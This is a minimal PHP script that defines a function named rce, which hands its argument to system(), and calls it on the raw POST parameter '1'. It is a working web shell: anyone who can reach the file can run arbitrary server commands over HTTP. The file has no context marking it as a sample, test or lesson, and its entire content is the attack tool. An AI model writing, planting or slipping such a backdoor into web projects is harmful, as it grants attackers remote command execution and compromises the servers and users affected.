<?php

function rce($cmd) {
    system($cmd);
}

rce($_POST[1]);
